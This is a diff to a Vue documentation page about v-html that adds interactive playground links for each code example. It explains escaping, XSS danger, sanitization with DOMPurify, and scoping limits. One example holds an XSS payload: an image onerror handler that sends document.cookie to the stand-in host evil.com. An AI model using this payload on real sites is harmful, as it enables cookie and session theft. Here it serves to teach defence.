@@ -25,6 +25,18 @@ const richContent = ref('<p>Hello <strong>world</strong></p>')
 </template>
 ```
 
+<PlaygroundLink code="<script setup>
+const richContent = ref('<p>Hello <strong>world</strong></p>')
+</script>
+&#10;<template>
+
+  <!-- Renders as styled HTML -->
+  <div v-html=&quot;richContent&quot; />
+&#10;  <!-- Compare with text interpolation -->
+  <div>{{ richContent }}</div>
+  <!-- Shows: <p>Hello <strong>world</strong></p> as plain text -->
+</template>" />
+
 Double curly braces `{{ }}` escape HTML entities automatically. `v-html` does not.
 
 ## The XSS danger
@@ -42,6 +54,18 @@ const userComment = ref(
   <div v-html="userComment" />
 </template>
 ```
+
+<PlaygroundLink code="<script setup>
+// Imagine this comes from a comment form, URL parameter, or database
+const userComment = ref(
+'Nice post! <img src=&quot;x&quot; onerror=&quot;document.location=\'https://evil.com/steal?cookie=\'+document.cookie&quot;>'
+)
+</script>
+&#10;<template>
+
+  <!-- This executes the attacker's JavaScript -->
+  <div v-html=&quot;userComment&quot; />
+</template>" />
 
 The `onerror` handler runs as soon as the browser tries to load the broken image. The attacker now has the user's cookies. Other attack vectors include `<script>` tags (though `innerHTML` doesn't execute them), `<iframe>`, `<svg onload>`, and event handlers on any element.
 
@@ -62,6 +86,17 @@ const rendered = computed(() => marked(markdownSource))
   <article v-html="rendered" />
 </template>
 ```
+
+<PlaygroundLink code="<script setup>
+import { marked } from 'marked'
+&#10;// Content written by YOUR team, stored in YOUR CMS
+const markdownSource = '## Title\n\nSome **bold** text'
+const rendered = computed(() => marked(markdownSource))
+</script>
+&#10;<template>
+
+  <article v-html=&quot;rendered&quot; />
+</template>" />
 
 Even with trusted content, sanitize as an extra layer of defense.
 
@@ -88,6 +123,17 @@ const safeHtml = computed(() => DOMPurify.sanitize(userContent.value))
 </template>
 ```
 
+<PlaygroundLink code="<script setup>
+import DOMPurify from 'dompurify'
+&#10;const userContent = ref('<p>Hello</p><script>alert(&quot;xss&quot;)<\/script>')
+&#10;const safeHtml = computed(() => DOMPurify.sanitize(userContent.value))
+</script>
+&#10;<template>
+
+  <!-- Script tag is stripped, only <p>Hello</p> remains -->
+  <div v-html=&quot;safeHtml&quot; />
+</template>" />
+
 DOMPurify strips dangerous tags and attributes while keeping safe formatting elements like `<p>`, `<strong>`, `<em>`, `<a>` (with sanitized `href`), and `<img>` (without event handlers).
 
 ## v-html limitations
@@ -104,6 +150,15 @@ const html = ref('<my-component>Hello</my-component>')
   <div v-html="html" />
 </template>
 ```
+
+<PlaygroundLink code="<script setup>
+const html = ref('<my-component>Hello</my-component>')
+</script>
+&#10;<template>
+
+  <!-- my-component will NOT be mounted as a Vue component -->
+  <div v-html=&quot;html&quot; />
+</template>" />
 
 Content injected with `v-html` is raw DOM. Vue components, directives (`v-if`, `v-for`), and template syntax (`{{ }}`) inside it are ignored. If you need dynamic templates, use render functions or the runtime compiler.
 
@@ -122,6 +177,17 @@ p {
 </template>
 ```
 
+<PlaygroundLink code="<style scoped>
+p {
+color: red;
+}
+</style>
+&#10;<template>
+
+  <!-- The <p> inside v-html won't be red -->
+  <div v-html=&quot;'<p>Not styled</p>'&quot; />
+</template>" />
+
 Scoped styles add a `data-v-xxxxx` attribute to elements compiled by Vue. Elements injected by `v-html` don't get that attribute, so scoped selectors don't match. Use `:deep()` to target them:
 
 ```vue
@@ -131,6 +197,12 @@ div :deep(p) {
 }
 </style>
 ```
+
+<PlaygroundLink code="<style scoped>
+div :deep(p) {
+  color: red;
+}
+</style>" />
 
 ## Alternatives to v-html
 
